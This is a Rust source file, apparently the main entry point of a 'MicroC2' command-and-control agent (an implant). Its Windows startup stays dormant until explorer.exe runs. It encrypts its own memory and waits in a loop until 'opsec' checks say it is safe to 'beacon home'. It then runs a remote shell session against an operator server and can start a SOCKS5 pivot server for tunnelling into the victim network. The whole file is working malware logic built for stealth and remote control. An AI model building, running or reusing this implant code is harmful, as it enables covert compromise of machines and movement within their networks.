mod commands;
mod config;
mod dormant;
mod networking;
mod opsec;
mod util;

use crate::commands::command_shell::run_shell;
use crate::config::AgentConfig;
use crate::dormant::MemoryProtector;
use crate::dormant::SensitiveState;
use crate::networking::socks5_pivot::Socks5PivotHandler;
use crate::networking::socks5_pivot_server::Socks5PivotServer;
use crate::opsec::{AgentMode, determine_agent_mode};
use log::{info, warn, error};
use once_cell::sync::Lazy;
use std::env;
use std::sync::Arc;
use std::sync::Mutex;
use std::time::Duration;
use std::ffi::OsStr;
use sysinfo::{System, RefreshKind};

static MEMORY_PROTECTOR: Lazy<Mutex<MemoryProtector>> = Lazy::new(|| {
    Mutex::new(MemoryProtector::new(SensitiveState {
        command_queue: Vec::new(),
        file_buffer: Vec::new(),
        config: None,
    }))
});

// Dormant startup function
// This function is called on Windows to wait for the system to be idle before starting the agent
// It checks for the presence of explorer.exe and waits for up to 10 minutes
#[cfg(target_os = "windows")]
fn dormant_startup() {
    let mut sys = System::new_with_specifics(RefreshKind::everything());
    let start = std::time::Instant::now();
    // Wait up to 10 minutes or until explorer.exe is running
    while start.elapsed().as_secs() < 600 {
        sys.refresh_specifics(RefreshKind::everything());
        if sys.processes_by_name(OsStr::new("explorer.exe")).next().is_some() {
            break;
        }
        std::thread::sleep(std::time::Duration::from_secs(5));
    }
}


#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    dormant_startup();

    env_logger::init();
    info!("[STARTUP] MicroC2 Agent starting...");

    let config = AgentConfig::load()?;
    info!("[CONFIG] Loaded agent config: {:?}", config);

    // Channel for pivot frames
    let (pivot_tx, mut pivot_rx) = tokio::sync::mpsc::channel(100);
    let pivot_handler = Arc::new(tokio::sync::Mutex::new(Socks5PivotHandler::new(pivot_tx.clone())));

    if config.socks5_enabled {
        info!("[CONFIG] SOCKS5 is enabled. Proxy: {}:{}, all C2 traffic will use SOCKS5 Proxy tunnel.", config.socks5_host, config.socks5_port);

        // Start SOCKS5 pivot server for operator-side pivoting
        let pivot_server = Socks5PivotServer::new(
            config.socks5_host.clone(),
            config.socks5_port,
            pivot_tx.clone(),
        );
        let pivot_handler_clone = pivot_handler.clone();
        tokio::spawn(async move {
            pivot_server.run(pivot_handler_clone).await;
        });
    } else {
        warn!("[CONFIG] SOCKS5 is disabled. Agent will use direct connection.");
    }

    // Spawn pivot frame handler in background
    let pivot_handler_bg = pivot_handler.clone();
    tokio::spawn(async move {
        while let Some(frame) = pivot_rx.recv().await {
            pivot_handler_bg.lock().await.handle_frame(frame).await;
        }
    });

    let server_addr = env::args()
        .nth(1)
        .unwrap_or_else(|| config.get_server_url());
    
    let agent_id = config.payload_id.clone();
    info!("[INFO] Agent ID: {}", agent_id);
    info!("[INFO] Using embedded configuration");

    // Start in FullOpsec mode
    {
        let mut protector = MEMORY_PROTECTOR.lock().unwrap();
        protector.protect();
    }

    info!("[AGENT] Starting main loop. Agent ID: {}", agent_id);

    //Wait until it is safe for E.T. to phone home
    loop {
        if determine_agent_mode() == AgentMode::BackgroundOpsec {
            info!("[OPSEC] Safe to beacon home. Decrypting sensitive memory and starting agent.");
            let mut protector = MEMORY_PROTECTOR.lock().unwrap();
            protector.unprotect();
            break;
        } else {
            info!("[OPSEC] Not safe to beacon home. Staying encrypted and dormant.");
            std::thread::sleep(Duration::from_secs(5));
        }
    }

    loop {
        if let Err(e) = run_shell(&server_addr, &agent_id, pivot_handler.clone(), pivot_tx.clone()).await {
            error!("[ERROR] Shell error: {}. Exiting...", e);
        }
        // After run_shell returns, re-encrypt and wait for safe conditions again
        {
            let mut protector = MEMORY_PROTECTOR.lock().unwrap();
            protector.protect();
        }
        info!("[OPSEC] Returned to FullOpsec. Waiting for safe conditions...");
        loop {
            if determine_agent_mode() == AgentMode::BackgroundOpsec {
                info!("[OPSEC] Safe to beacon home again. Decrypting sensitive memory and resuming agent.");
                let mut protector = MEMORY_PROTECTOR.lock().unwrap();
                protector.unprotect();
                break;
            } else {
                std::thread::sleep(Duration::from_secs(5));
                info!("[OPSEC] Not safe to beacon home. Staying encrypted and dormant.");
            }
        }
    }
    // Ok(())
}

fn on_mode_transition(new_mode: AgentMode) {
    let mut protector = MEMORY_PROTECTOR.lock().unwrap();
    match new_mode {
        AgentMode::FullOpsec => protector.protect(),
        AgentMode::BackgroundOpsec => protector.unprotect(),
    }
}

fn cleanup() {
    let mut protector = MEMORY_PROTECTOR.lock().unwrap();
    protector.zeroize();
}
